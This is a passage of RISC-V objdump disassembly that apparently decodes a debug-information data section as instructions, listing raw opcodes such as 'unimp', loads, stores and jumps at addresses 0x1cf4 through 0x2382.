    1cf4:	0000                	unimp
    1cf6:	df02                	sw	zero,188(sp)
    1cf8:	00202a03          	lw	s4,2(zero) # 2 <_tdata_begin+0x2>
    1cfc:	0080                	addi	s0,sp,64
    1cfe:	0000                	unimp
    1d00:	3700                	fld	fs0,40(a4)
    1d02:	0685                	addi	a3,a3,1
    1d04:	0000                	unimp
    1d06:	0b02                	slli	s6,s6,0x0
    1d08:	0501                	addi	a0,a0,0
    1d0a:	2104                	fld	fs1,0(a0)
    1d0c:	8000                	0x8000
    1d0e:	0000                	unimp
    1d10:	0000                	unimp
    1d12:	0007e837          	lui	a6,0x7e
    1d16:	0200                	addi	s0,sp,256
    1d18:	b605014b          	fnmsub.q	ft2,fa0,ft0,fs6,rne
    1d1c:	0022                	c.slli	zero,0x8
    1d1e:	0080                	addi	s0,sp,64
    1d20:	0000                	unimp
    1d22:	3700                	fld	fs0,40(a4)
    1d24:	07e6                	slli	a5,a5,0x19
    1d26:	0000                	unimp
    1d28:	4902                	lw	s2,0(sp)
    1d2a:	0501                	addi	a0,a0,0
    1d2c:	22a2                	fld	ft5,8(sp)
    1d2e:	8000                	0x8000
    1d30:	0000                	unimp
    1d32:	0000                	unimp
    1d34:	2100                	fld	fs0,0(a0)
    1d36:	0f52                	slli	t5,t5,0x14
    1d38:	0000                	unimp
    1d3a:	00004917          	auipc	s2,0x4
    1d3e:	1700                	addi	s0,sp,928
    1d40:	0db1                	addi	s11,s11,12
    1d42:	0000                	unimp
    1d44:	1200                	addi	s0,sp,288
    1d46:	4208                	lw	a0,0(a2)
    1d48:	3800000f          	0x3800000f
    1d4c:	07df 0000 bc02      	0xbc02000007df
    1d52:	ba12                	fsd	ft4,304(sp)
    1d54:	0000                	unimp
    1d56:	4600                	lw	s0,8(a2)
    1d58:	001f 0080 0000      	0x80001f
    1d5e:	6800                	ld	s0,16(s0)
    1d60:	0000                	unimp
    1d62:	0000                	unimp
    1d64:	0000                	unimp
    1d66:	0100                	addi	s0,sp,128
    1d68:	989c                	0x989c
    1d6a:	3300000f          	0x3300000f
    1d6e:	7061                	c.lui	zero,0xffff8
    1d70:	0200                	addi	s0,sp,256
    1d72:	22bc                	fld	fa5,64(a3)
    1d74:	0f98                	addi	a4,sp,976
    1d76:	0000                	unimp
    1d78:	9102                	jalr	sp
    1d7a:	3268                	fld	fa0,224(a2)
    1d7c:	000007a3          	sb	zero,15(zero) # ffffffffffff800f <_end+0xffffffff7ffdcb4f>
    1d80:	bc02                	fsd	ft0,56(sp)
    1d82:	492a                	lw	s2,136(sp)
    1d84:	0000                	unimp
    1d86:	0200                	addi	s0,sp,256
    1d88:	6491                	lui	s1,0x4
    1d8a:	1200                	addi	s0,sp,288
    1d8c:	8808                	0x8808
    1d8e:	0009                	c.nop	2
    1d90:	3800                	fld	fs0,48(s0)
    1d92:	06ad                	addi	a3,a3,11
    1d94:	0000                	unimp
    1d96:	b202                	fsd	ft0,288(sp)
    1d98:	0008741b          	0x8741b
    1d9c:	da00                	sw	s0,48(a2)
    1d9e:	001e                	c.slli	zero,0x7
    1da0:	0080                	addi	s0,sp,64
    1da2:	0000                	unimp
    1da4:	6c00                	ld	s0,24(s0)
    1da6:	0000                	unimp
    1da8:	0000                	unimp
    1daa:	0000                	unimp
    1dac:	0100                	addi	s0,sp,128
    1dae:	de9c                	sw	a5,56(a3)
    1db0:	3300000f          	0x3300000f
    1db4:	7061                	c.lui	zero,0xffff8
    1db6:	0200                	addi	s0,sp,256
    1db8:	2cb2                	fld	fs9,264(sp)
    1dba:	0f98                	addi	a4,sp,976
    1dbc:	0000                	unimp
    1dbe:	9102                	jalr	sp
    1dc0:	3268                	fld	fa0,224(a2)
    1dc2:	000007a3          	sb	zero,15(zero) # ffffffffffff800f <_end+0xffffffff7ffdcb4f>
    1dc6:	b202                	fsd	ft0,288(sp)
    1dc8:	4934                	lw	a3,80(a0)
    1dca:	0000                	unimp
    1dcc:	0200                	addi	s0,sp,256
    1dce:	6491                	lui	s1,0x4
    1dd0:	3100                	fld	fs0,32(a0)
    1dd2:	000006f3          	0x6f3
    1dd6:	9d02                	jalr	s10
    1dd8:	d814                	sw	a3,48(s0)
    1dda:	001d                	c.nop	7
    1ddc:	0080                	addi	s0,sp,64
    1dde:	0000                	unimp
    1de0:	0200                	addi	s0,sp,256
    1de2:	0001                	nop
    1de4:	0000                	unimp
    1de6:	0000                	unimp
    1de8:	0100                	addi	s0,sp,128
    1dea:	7c9c                	ld	a5,56(s1)
    1dec:	0010                	0x10
    1dee:	3200                	fld	fs0,32(a2)
    1df0:	08f8                	addi	a4,sp,92
    1df2:	0000                	unimp
    1df4:	9d02                	jalr	s10
    1df6:	5224                	lw	s1,96(a2)
    1df8:	0300000f          	fence	rw,unknown
    1dfc:	d891                	beqz	s1,1d10 <_tbss_end+0x1c8c>
    1dfe:	327d                	addiw	tp,tp,-1
    1e00:	07f6                	slli	a5,a5,0x1d
    1e02:	0000                	unimp
    1e04:	9d02                	jalr	s10
    1e06:	b140                	fsd	fs0,160(a0)
    1e08:	000d                	c.nop	3
    1e0a:	0300                	addi	s0,sp,384
    1e0c:	d091                	beqz	s1,1d10 <_tbss_end+0x1c8c>
    1e0e:	337d                	addiw	t1,t1,-1
    1e10:	756e                	ld	a0,248(sp)
    1e12:	006d                	c.nop	27
    1e14:	9e02                	jalr	t3
    1e16:	7428                	ld	a0,104(s0)
    1e18:	0008                	0x8
    1e1a:	0300                	addi	s0,sp,384
    1e1c:	c891                	beqz	s1,1e30 <_tbss_end+0x1dac>
    1e1e:	327d                	addiw	tp,tp,-1
    1e20:	00000103          	lb	sp,0(zero) # 0 <_tdata_begin>
    1e24:	9e02                	jalr	t3
    1e26:	5f36                	lw	t5,108(sp)
    1e28:	0000                	unimp
    1e2a:	0300                	addi	s0,sp,384
    1e2c:	c491                	beqz	s1,1e38 <_tbss_end+0x1db4>
    1e2e:	327d                	addiw	tp,tp,-1
    1e30:	072c                	addi	a1,sp,904
    1e32:	0000                	unimp
    1e34:	9e02                	jalr	t3
    1e36:	4940                	lw	s0,20(a0)
    1e38:	0000                	unimp
    1e3a:	0300                	addi	s0,sp,384
    1e3c:	c091                	beqz	s1,1e40 <_tbss_end+0x1dbc>
    1e3e:	327d                	addiw	tp,tp,-1
    1e40:	0718                	addi	a4,sp,896
    1e42:	0000                	unimp
    1e44:	9e02                	jalr	t3
    1e46:	0000494b          	fnmsub.s	fs2,ft0,ft0,ft0,rmm
    1e4a:	0300                	addi	s0,sp,384
    1e4c:	bc91                	j	18a0 <_tbss_end+0x181c>
    1e4e:	247d                	addiw	s0,s0,31
    1e50:	000008eb          	0x8eb
    1e54:	a002                	fsd	ft0,0(sp)
    1e56:	7c0c                	ld	a1,56(s0)
    1e58:	0010                	0x10
    1e5a:	0300                	addi	s0,sp,384
    1e5c:	e891                	bnez	s1,1e70 <_tbss_end+0x1dec>
    1e5e:	347d                	addiw	s0,s0,-1
    1e60:	6f70                	ld	a2,216(a4)
    1e62:	a1020073          	0xa1020073
    1e66:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1e6a:	0200                	addi	s0,sp,256
    1e6c:	6c91                	lui	s9,0x4
    1e6e:	0a00                	addi	s0,sp,272
    1e70:	005f 0000 108c      	0x108c0000005f
    1e76:	0000                	unimp
    1e78:	0000790b          	0x790b
    1e7c:	3f00                	fld	fs0,56(a4)
    1e7e:	3900                	fld	fs0,48(a0)
    1e80:	00000903          	lb	s2,0(zero) # 0 <_tdata_begin>
    1e84:	8f02                	jr	t5
    1e86:	4a06                	lw	s4,64(sp)
    1e88:	001d                	c.nop	7
    1e8a:	0080                	addi	s0,sp,64
    1e8c:	0000                	unimp
    1e8e:	8e00                	0x8e00
    1e90:	0000                	unimp
    1e92:	0000                	unimp
    1e94:	0000                	unimp
    1e96:	0100                	addi	s0,sp,128
    1e98:	d49c                	sw	a5,40(s1)
    1e9a:	0010                	0x10
    1e9c:	3300                	fld	fs0,32(a4)
    1e9e:	0078                	addi	a4,sp,12
    1ea0:	8f02                	jr	t5
    1ea2:	8c18                	0x8c18
    1ea4:	0000                	unimp
    1ea6:	0200                	addi	s0,sp,256
    1ea8:	4891                	li	a7,4
    1eaa:	7334                	ld	a3,96(a4)
    1eac:	7274                	ld	a3,224(a2)
    1eae:	0200                	addi	s0,sp,256
    1eb0:	0891                	addi	a7,a7,4
    1eb2:	10d4                	addi	a3,sp,100
    1eb4:	0000                	unimp
    1eb6:	9102                	jalr	sp
    1eb8:	3458                	fld	fa4,168(s0)
    1eba:	0069                	c.nop	26
    1ebc:	9202                	jalr	tp
    1ebe:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1ec2:	0200                	addi	s0,sp,256
    1ec4:	6c91                	lui	s9,0x4
    1ec6:	0a00                	addi	s0,sp,272
    1ec8:	061a                	slli	a2,a2,0x6
    1eca:	0000                	unimp
    1ecc:	10e4                	addi	s1,sp,108
    1ece:	0000                	unimp
    1ed0:	0000790b          	0x790b
    1ed4:	1000                	addi	s0,sp,32
    1ed6:	2e00                	fld	fs0,24(a2)
    1ed8:	06b5                	addi	a3,a3,13
    1eda:	0000                	unimp
    1edc:	4905dc03          	lhu	s8,1168(a1)
    1ee0:	0000                	unimp
    1ee2:	d800                	sw	s0,48(s0)
    1ee4:	001c                	0x1c
    1ee6:	0080                	addi	s0,sp,64
    1ee8:	0000                	unimp
    1eea:	7200                	ld	s0,32(a2)
    1eec:	0000                	unimp
    1eee:	0000                	unimp
    1ef0:	0000                	unimp
    1ef2:	0100                	addi	s0,sp,128
    1ef4:	2e9c                	fld	fa5,24(a3)
    1ef6:	0011                	c.nop	4
    1ef8:	3300                	fld	fs0,32(a4)
    1efa:	02006863          	bltu	zero,zero,1f2a <_tbss_end+0x1ea6>
    1efe:	117f                	0x117f
    1f00:	0049                	c.nop	18
    1f02:	0000                	unimp
    1f04:	9102                	jalr	sp
    1f06:	3a6c                	fld	fa1,240(a2)
    1f08:	7562                	ld	a0,56(sp)
    1f0a:	0066                	c.slli	zero,0x19
    1f0c:	8102                	jr	sp
    1f0e:	2e18                	fld	fa4,24(a2)
    1f10:	0011                	c.nop	4
    1f12:	4000                	lw	s0,0(s0)
    1f14:	00077b3b          	0x77b3b
    1f18:	0200                	addi	s0,sp,256
    1f1a:	1782                	slli	a5,a5,0x20
    1f1c:	0049                	c.nop	18
    1f1e:	0000                	unimp
    1f20:	0a00                	addi	s0,sp,272
    1f22:	061a                	slli	a2,a2,0x6
    1f24:	0000                	unimp
    1f26:	113e                	slli	sp,sp,0x2f
    1f28:	0000                	unimp
    1f2a:	0000790b          	0x790b
    1f2e:	3f00                	fld	fs0,56(a4)
    1f30:	3900                	fld	fs0,48(a0)
    1f32:	07c4                	addi	s1,sp,964
    1f34:	0000                	unimp
    1f36:	6b02                	ld	s6,0(sp)
    1f38:	f206                	sd	ra,288(sp)
    1f3a:	0080001b          	addiw	zero,zero,8
    1f3e:	0000                	unimp
    1f40:	e600                	sd	s0,8(a2)
    1f42:	0000                	unimp
    1f44:	0000                	unimp
    1f46:	0000                	unimp
    1f48:	0100                	addi	s0,sp,128
    1f4a:	c99c                	sw	a5,16(a1)
    1f4c:	0011                	c.nop	4
    1f4e:	3300                	fld	fs0,32(a4)
    1f50:	00646963          	bltu	s0,t1,1f62 <_tbss_end+0x1ede>
    1f54:	6b02                	ld	s6,0(sp)
    1f56:	4910                	lw	a2,16(a0)
    1f58:	0000                	unimp
    1f5a:	0300                	addi	s0,sp,384
    1f5c:	dc91                	beqz	s1,1e78 <_tbss_end+0x1df4>
    1f5e:	337e                	fld	ft6,504(sp)
    1f60:	636e                	ld	t1,216(sp)
    1f62:	0200                	addi	s0,sp,256
    1f64:	0049196b          	0x49196b
    1f68:	0000                	unimp
    1f6a:	7ed89103          	lh	sp,2029(a7)
    1f6e:	7234                	ld	a3,96(a2)
    1f70:	7465                	lui	s0,0xffff9
    1f72:	0200                	addi	s0,sp,256
    1f74:	0771                	addi	a4,a4,28
    1f76:	0049                	c.nop	18
    1f78:	0000                	unimp
    1f7a:	9102                	jalr	sp
    1f7c:	3c50                	fld	fa2,184(s0)
    1f7e:	7562                	ld	a0,56(sp)
    1f80:	0066                	c.slli	zero,0x19
    1f82:	7302                	ld	t1,32(sp)
    1f84:	2e08                	fld	fa0,24(a2)
    1f86:	0011                	c.nop	4
    1f88:	4000                	lw	s0,0(s0)
    1f8a:	7902                	ld	s2,32(sp)
    1f8c:	2400                	fld	fs0,8(s0)
    1f8e:	091d                	addi	s2,s2,7
    1f90:	0000                	unimp
    1f92:	7402                	ld	s0,32(sp)
    1f94:	1409                	addi	s0,s0,-30
    1f96:	0006                	c.slli	zero,0x1
    1f98:	0200                	addi	s0,sp,256
    1f9a:	5891                	li	a7,-28
    1f9c:	4a2c                	lw	a1,80(a2)
    1f9e:	001c                	0x1c
    1fa0:	0080                	addi	s0,sp,64
    1fa2:	0000                	unimp
    1fa4:	7600                	ld	s0,40(a2)
    1fa6:	0000                	unimp
    1fa8:	0000                	unimp
    1faa:	0000                	unimp
    1fac:	3400                	fld	fs0,40(s0)
    1fae:	0069                	c.nop	26
    1fb0:	7502                	ld	a0,32(sp)
    1fb2:	490c                	lw	a1,16(a0)
    1fb4:	0000                	unimp
    1fb6:	0200                	addi	s0,sp,256
    1fb8:	5491                	li	s1,-28
    1fba:	0000                	unimp
    1fbc:	683d                	lui	a6,0xf
    1fbe:	0009                	c.nop	2
    1fc0:	0200                	addi	s0,sp,256
    1fc2:	0d60                	addi	s0,sp,668
    1fc4:	1b98                	addi	a4,sp,496
    1fc6:	8000                	0x8000
    1fc8:	0000                	unimp
    1fca:	0000                	unimp
    1fcc:	005a                	c.slli	zero,0x16
    1fce:	0000                	unimp
    1fd0:	0000                	unimp
    1fd2:	0000                	unimp
    1fd4:	9c01                	subw	s0,s0,s0
    1fd6:	1244                	addi	s1,sp,292
    1fd8:	0000                	unimp
    1fda:	4724                	lw	s1,72(a4)
    1fdc:	0008                	0x8
    1fde:	0200                	addi	s0,sp,256
    1fe0:	1262                	slli	tp,tp,0x38
    1fe2:	0000015b          	0x15b
    1fe6:	5401                	li	s0,-32
    1fe8:	00065b23          	0x65b23
    1fec:	0200                	addi	s0,sp,256
    1fee:	061a0f63          	beq	s4,ra,206c <_tbss_end+0x1fe8>
    1ff2:	0000                	unimp
    1ff4:	00081523          	sh	zero,10(a6) # f00a <_tbss_end+0xef86>
    1ff8:	0200                	addi	s0,sp,256
    1ffa:	1864                	addi	s1,sp,60
    1ffc:	061a                	slli	a2,a2,0x6
    1ffe:	0000                	unimp
    2000:	0006a223          	sw	zero,4(a3)
    2004:	0200                	addi	s0,sp,256
    2006:	2664                	fld	fs1,200(a2)
    2008:	061a                	slli	a2,a2,0x6
    200a:	0000                	unimp
    200c:	00086923          	0x86923
    2010:	0200                	addi	s0,sp,256
    2012:	3264                	fld	fs1,224(a2)
    2014:	061a                	slli	a2,a2,0x6
    2016:	0000                	unimp
    2018:	9724                	0x9724
    201a:	0006                	c.slli	zero,0x1
    201c:	0200                	addi	s0,sp,256
    201e:	0a65                	addi	s4,s4,25
    2020:	00ae                	slli	ra,ra,0xb
    2022:	0000                	unimp
    2024:	9102                	jalr	sp
    2026:	2468                	fld	fa0,200(s0)
    2028:	083d                	addi	a6,a6,15
    202a:	0000                	unimp
    202c:	6702                	ld	a4,0(sp)
    202e:	ae0a                	fsd	ft2,280(sp)
    2030:	0000                	unimp
    2032:	0200                	addi	s0,sp,256
    2034:	6091                	lui	ra,0x4
    2036:	2e00                	fld	fs0,24(a2)
    2038:	05fc                	addi	a5,sp,716
    203a:	0000                	unimp
    203c:	5902                	lw	s2,32(sp)
    203e:	0000491b          	0x491b
    2042:	6e00                	ld	s0,24(a2)
    2044:	0080001b          	addiw	zero,zero,8
    2048:	0000                	unimp
    204a:	2a00                	fld	fs0,16(a2)
    204c:	0000                	unimp
    204e:	0000                	unimp
    2050:	0000                	unimp
    2052:	0100                	addi	s0,sp,128
    2054:	859c                	0x859c
    2056:	0012                	c.slli	zero,0x4
    2058:	3200                	fld	fs0,32(a2)
    205a:	07fd                	addi	a5,a5,31
    205c:	0000                	unimp
    205e:	5902                	lw	s2,32(sp)
    2060:	4924                	lw	s1,80(a0)
    2062:	0000                	unimp
    2064:	0200                	addi	s0,sp,256
    2066:	6c91                	lui	s9,0x4
    2068:	0832                	slli	a6,a6,0xc
    206a:	0008                	0x8
    206c:	0200                	addi	s0,sp,256
    206e:	3159                	addiw	sp,sp,-10
    2070:	00000db7          	lui	s11,0x0
    2074:	9102                	jalr	sp
    2076:	0060                	addi	s0,sp,12
    2078:	df3e                	sw	a5,188(sp)
    207a:	0006                	c.slli	zero,0x1
    207c:	0200                	addi	s0,sp,256
    207e:	1c52                	slli	s8,s8,0x34
    2080:	1b48                	addi	a0,sp,436
    2082:	8000                	0x8000
    2084:	0000                	unimp
    2086:	0000                	unimp
    2088:	0026                	c.slli	zero,0x9
    208a:	0000                	unimp
    208c:	0000                	unimp
    208e:	0000                	unimp
    2090:	9c01                	subw	s0,s0,s0
    2092:	12c1                	addi	t0,t0,-16
    2094:	0000                	unimp
    2096:	64696333          	0x64696333
    209a:	0200                	addi	s0,sp,256
    209c:	2d52                	fld	fs10,272(sp)
    209e:	0049                	c.nop	18
    20a0:	0000                	unimp
    20a2:	9102                	jalr	sp
    20a4:	336c                	fld	fa1,224(a4)
    20a6:	636e                	ld	t1,216(sp)
    20a8:	0200                	addi	s0,sp,256
    20aa:	3652                	fld	fa2,304(sp)
    20ac:	0049                	c.nop	18
    20ae:	0000                	unimp
    20b0:	9102                	jalr	sp
    20b2:	0068                	addi	a0,sp,12
    20b4:	c239                	beqz	a2,20fa <_tbss_end+0x2076>
    20b6:	0006                	c.slli	zero,0x1
    20b8:	0200                	addi	s0,sp,256
    20ba:	064d                	addi	a2,a2,19
    20bc:	1b12                	slli	s6,s6,0x24
    20be:	8000                	0x8000
    20c0:	0000                	unimp
    20c2:	0000                	unimp
    20c4:	0036                	c.slli	zero,0xd
    20c6:	0000                	unimp
    20c8:	0000                	unimp
    20ca:	0000                	unimp
    20cc:	9c01                	subw	s0,s0,s0
    20ce:	12ed                	addi	t0,t0,-5
    20d0:	0000                	unimp
    20d2:	02007333          	remu	t1,zero,zero
    20d6:	1b4d                	addi	s6,s6,-13
    20d8:	064a                	slli	a2,a2,0x12
    20da:	0000                	unimp
    20dc:	9102                	jalr	sp
    20de:	0058                	addi	a4,sp,4
    20e0:	0007033f 06480200 	0x64802000007033f
    20e8:	1b02                	slli	s6,s6,0x20
    20ea:	8000                	0x8000
    20ec:	0000                	unimp
    20ee:	0000                	unimp
    20f0:	0010                	0x10
    20f2:	0000                	unimp
    20f4:	0000                	unimp
    20f6:	0000                	unimp
    20f8:	9c01                	subw	s0,s0,s0
    20fa:	3340                	fld	fs0,160(a4)
    20fc:	0009                	c.nop	2
    20fe:	0200                	addi	s0,sp,256
    2100:	1aea0643          	fmadd.d	fa2,fs4,fa4,ft3,rne
    2104:	8000                	0x8000
    2106:	0000                	unimp
    2108:	0000                	unimp
    210a:	0018                	0x18
    210c:	0000                	unimp
    210e:	0000                	unimp
    2110:	0000                	unimp
    2112:	9c01                	subw	s0,s0,s0
    2114:	1335                	addi	t1,t1,-19
    2116:	0000                	unimp
    2118:	4032                	0x4032
    211a:	02000007          	0x2000007
    211e:	00490f43          	fmadd.s	ft10,fs2,ft4,ft0,rne
    2122:	0000                	unimp
    2124:	9102                	jalr	sp
    2126:	006c                	addi	a1,sp,12
    2128:	d32e                	sw	a1,164(sp)
    212a:	0006                	c.slli	zero,0x1
    212c:	0200                	addi	s0,sp,256
    212e:	213e                	fld	ft2,456(sp)
    2130:	009d                	addi	ra,ra,7
    2132:	0000                	unimp
    2134:	1ace                	slli	s5,s5,0x33
    2136:	8000                	0x8000
    2138:	0000                	unimp
    213a:	0000                	unimp
    213c:	001c                	0x1c
    213e:	0000                	unimp
    2140:	0000                	unimp
    2142:	0000                	unimp
    2144:	9c01                	subw	s0,s0,s0
    2146:	1385                	addi	t2,t2,-31
    2148:	0000                	unimp
    214a:	7732                	ld	a4,296(sp)
    214c:	0006                	c.slli	zero,0x1
    214e:	0200                	addi	s0,sp,256
    2150:	373e                	fld	fa4,488(sp)
    2152:	009d                	addi	ra,ra,7
    2154:	0000                	unimp
    2156:	9102                	jalr	sp
    2158:	3368                	fld	fa0,224(a4)
    215a:	7065                	c.lui	zero,0xffff9
    215c:	3e020063          	beqz	tp,253c <_tbss_end+0x24b8>
    2160:	9d48                	0x9d48
    2162:	0000                	unimp
    2164:	0200                	addi	s0,sp,256
    2166:	6091                	lui	ra,0x4
    2168:	bd32                	fsd	fa2,184(sp)
    216a:	0006                	c.slli	zero,0x1
    216c:	0200                	addi	s0,sp,256
    216e:	573e                	lw	a4,236(sp)
    2170:	0c30                	addi	a2,sp,536
    2172:	0000                	unimp
    2174:	9102                	jalr	sp
    2176:	0058                	addi	a4,sp,4
    2178:	2c41                	addiw	s8,s8,16
    217a:	0009                	c.nop	2
    217c:	0200                	addi	s0,sp,256
    217e:	2038                	fld	fa4,64(s0)
    2180:	1aae                	slli	s5,s5,0x2b
    2182:	8000                	0x8000
    2184:	0000                	unimp
    2186:	0000                	unimp
    2188:	0020                	addi	s0,sp,8
    218a:	0000                	unimp
    218c:	0000                	unimp
    218e:	0000                	unimp
    2190:	9c01                	subw	s0,s0,s0
    2192:	000013b3          	sll	t2,zero,zero
    2196:	4032                	0x4032
    2198:	02000007          	0x2000007
    219c:	3638                	fld	fa4,104(a2)
    219e:	009d                	addi	ra,ra,7
    21a0:	0000                	unimp
    21a2:	9102                	jalr	sp
    21a4:	0068                	addi	a0,sp,12
    21a6:	5f3e                	lw	t5,236(sp)
    21a8:	0009                	c.nop	2
    21aa:	0200                	addi	s0,sp,256
    21ac:	0628                	addi	a0,sp,776
    21ae:	199e                	slli	s3,s3,0x27
    21b0:	8000                	0x8000
    21b2:	0000                	unimp
    21b4:	0000                	unimp
    21b6:	0110                	addi	a2,sp,128
    21b8:	0000                	unimp
    21ba:	0000                	unimp
    21bc:	0000                	unimp
    21be:	9c01                	subw	s0,s0,s0
    21c0:	00001477          	0x1477
    21c4:	fc32                	sd	a2,56(sp)
    21c6:	0006                	c.slli	zero,0x1
    21c8:	0200                	addi	s0,sp,256
    21ca:	1328                	addi	a0,sp,424
    21cc:	0049                	c.nop	18
    21ce:	0000                	unimp
    21d0:	7fbc9103          	lh	sp,2043(s9) # 47fb <_tbss_end+0x4777>
    21d4:	6934                	ld	a3,80(a0)
    21d6:	0200                	addi	s0,sp,256
    21d8:	072a                	slli	a4,a4,0xa
    21da:	0049                	c.nop	18
    21dc:	0000                	unimp
    21de:	9102                	jalr	sp
    21e0:	2b5c                	fld	fa5,144(a4)
    21e2:	19ae                	slli	s3,s3,0x2b
    21e4:	8000                	0x8000
    21e6:	0000                	unimp
    21e8:	0000                	unimp
    21ea:	007c                	addi	a5,sp,12
    21ec:	0000                	unimp
    21ee:	0000                	unimp
    21f0:	0000                	unimp
    21f2:	1434                	addi	a3,sp,552
    21f4:	0000                	unimp
    21f6:	6334                	ld	a3,64(a4)
    21f8:	02007273          	csrrci	tp,0x20,0
    21fc:	0332                	slli	t1,t1,0xc
    21fe:	009d                	addi	ra,ra,7
    2200:	0000                	unimp
    2202:	9102                	jalr	sp
    2204:	2c68                	fld	fa0,216(s0)
    2206:	19bc                	addi	a5,sp,248
    2208:	8000                	0x8000
    220a:	0000                	unimp
    220c:	0000                	unimp
    220e:	000c                	0xc
    2210:	0000                	unimp
    2212:	0000                	unimp
    2214:	0000                	unimp
    2216:	b224                	fsd	fs1,96(a2)
    2218:	0001                	nop
    221a:	0200                	addi	s0,sp,256
    221c:	0332                	slli	t1,t1,0xc
    221e:	0079                	c.nop	30
    2220:	0000                	unimp
    2222:	9102                	jalr	sp
    2224:	0050                	addi	a2,sp,4
    2226:	2c00                	fld	fs0,24(s0)
    2228:	1a2a                	slli	s4,s4,0x2a
    222a:	8000                	0x8000
    222c:	0000                	unimp
    222e:	0000                	unimp
    2230:	007c                	addi	a5,sp,12
    2232:	0000                	unimp
    2234:	0000                	unimp
    2236:	0000                	unimp
    2238:	6334                	ld	a3,64(a4)
    223a:	02007273          	csrrci	tp,0x20,0
    223e:	009d0333          	add	t1,s10,s1
    2242:	0000                	unimp
    2244:	9102                	jalr	sp
    2246:	2c60                	fld	fs0,216(s0)
    2248:	1a38                	addi	a4,sp,312
    224a:	8000                	0x8000
    224c:	0000                	unimp
    224e:	0000                	unimp
    2250:	000c                	0xc
    2252:	0000                	unimp
    2254:	0000                	unimp
    2256:	0000                	unimp
    2258:	b224                	fsd	fs1,96(a2)
    225a:	0001                	nop
    225c:	0200                	addi	s0,sp,256
    225e:	00790333          	add	t1,s2,t2
    2262:	0000                	unimp
    2264:	9102                	jalr	sp
    2266:	0048                	addi	a0,sp,4
    2268:	0000                	unimp
    226a:	ca38                	sw	a4,80(a2)
    226c:	02000007          	0x2000007
    2270:	1212                	slli	tp,tp,0x24
    2272:	009d                	addi	ra,ra,7
    2274:	0000                	unimp
    2276:	1920                	addi	s0,sp,184
    2278:	8000                	0x8000
    227a:	0000                	unimp
    227c:	0000                	unimp
    227e:	007e                	c.slli	zero,0x1f
    2280:	0000                	unimp
    2282:	0000                	unimp
    2284:	0000                	unimp
    2286:	9c01                	subw	s0,s0,s0
    2288:	14ea                	slli	s1,s1,0x3a
    228a:	0000                	unimp
    228c:	0232                	slli	tp,tp,0xc
    228e:	0008                	0x8
    2290:	0200                	addi	s0,sp,256
    2292:	2412                	fld	fs0,256(sp)
    2294:	009d                	addi	ra,ra,7
    2296:	0000                	unimp
    2298:	7ef89103          	lh	sp,2031(a7)
    229c:	b532                	fsd	fa2,168(sp)
    229e:	02000007          	0x2000007
    22a2:	3412                	fld	fs0,288(sp)
    22a4:	008c                	addi	a1,sp,64
    22a6:	0000                	unimp
    22a8:	7ef09103          	lh	sp,2031(ra) # 47ef <_tbss_end+0x476b>
    22ac:	ba32                	fsd	fa2,304(sp)
    22ae:	02000007          	0x2000007
    22b2:	4312                	lw	t1,4(sp)
    22b4:	008c                	addi	a1,sp,64
    22b6:	0000                	unimp
    22b8:	7ee89103          	lh	sp,2030(a7)
    22bc:	bf32                	fsd	fa2,440(sp)
    22be:	02000007          	0x2000007
    22c2:	5212                	lw	tp,36(sp)
    22c4:	008c                	addi	a1,sp,64
    22c6:	0000                	unimp
    22c8:	7ee09103          	lh	sp,2030(ra)
    22cc:	2242                	fld	ft4,16(sp)
    22ce:	0009                	c.nop	2
    22d0:	0200                	addi	s0,sp,256
    22d2:	1514                	addi	a3,sp,672
    22d4:	14fa                	slli	s1,s1,0x3e
    22d6:	0000                	unimp
    22d8:	0240                	addi	s0,sp,260
    22da:	007f                	0x7f
    22dc:	0a00                	addi	s0,sp,272
    22de:	0098                	addi	a4,sp,64
    22e0:	0000                	unimp
    22e2:	14fa                	slli	s1,s1,0x3e
    22e4:	0000                	unimp
    22e6:	0000790b          	0x790b
    22ea:	0700                	addi	s0,sp,896
    22ec:	0400                	addi	s0,sp,512
    22ee:	14ea                	slli	s1,s1,0x3a
    22f0:	0000                	unimp
    22f2:	4538                	lw	a4,72(a0)
    22f4:	01000007          	0x1000007
    22f8:	1172                	slli	sp,sp,0x3c
    22fa:	008c                	addi	a1,sp,64
    22fc:	0000                	unimp
    22fe:	18ea                	slli	a7,a7,0x3a
    2300:	8000                	0x8000
    2302:	0000                	unimp
    2304:	0000                	unimp
    2306:	0036                	c.slli	zero,0xd
    2308:	0000                	unimp
    230a:	0000                	unimp
    230c:	0000                	unimp
    230e:	9c01                	subw	s0,s0,s0
    2310:	153e                	slli	a0,a0,0x2f
    2312:	0000                	unimp
    2314:	01007833          	and	a6,zero,a6
    2318:	1f72                	slli	t5,t5,0x3c
    231a:	008c                	addi	a1,sp,64
    231c:	0000                	unimp
    231e:	9102                	jalr	sp
    2320:	3458                	fld	fa4,168(s0)
    2322:	6962                	ld	s2,24(sp)
    2324:	0074                	addi	a3,sp,12
    2326:	7401                	lui	s0,0xfffe0
    2328:	8c0c                	0x8c0c
    232a:	0000                	unimp
    232c:	0200                	addi	s0,sp,256
    232e:	6891                	lui	a7,0x4
    2330:	4300                	lw	s0,0(a4)
    2332:	000006cb          	fnmsub.s	fa3,ft0,ft0,ft0,rne
    2336:	5e01                	li	t3,-32
    2338:	00186027          	0x186027
    233c:	0080                	addi	s0,sp,64
    233e:	0000                	unimp
    2340:	8a00                	0x8a00
    2342:	0000                	unimp
    2344:	0000                	unimp
    2346:	0000                	unimp
    2348:	0100                	addi	s0,sp,128
    234a:	a49c                	fsd	fa5,8(s1)
    234c:	0015                	c.nop	5
    234e:	3200                	fld	fs0,32(a2)
    2350:	0822                	slli	a6,a6,0x8
    2352:	0000                	unimp
    2354:	5e01                	li	t3,-32
    2356:	00004933          	xor	s2,zero,zero
    235a:	0200                	addi	s0,sp,256
    235c:	6c91                	lui	s9,0x4
    235e:	1224                	addi	s1,sp,296
    2360:	0009                	c.nop	2
    2362:	0100                	addi	s0,sp,128
    2364:	1760                	addi	s0,sp,940
    2366:	0050                	addi	a2,sp,4
    2368:	0000                	unimp
    236a:	0309                	addi	t1,t1,2
    236c:	b4a4                	fsd	fs1,104(s1)
    236e:	8001                	srli	s0,s0,0x0
    2370:	0000                	unimp
    2372:	0000                	unimp
    2374:	9024                	0x9024
    2376:	0004                	0x4
    2378:	0100                	addi	s0,sp,128
    237a:	1761                	addi	a4,a4,-8
    237c:	0050                	addi	a2,sp,4
    237e:	0000                	unimp
    2380:	0309                	addi	t1,t1,2
    2382:	b4a0                	fsd	fs0,104(s1)
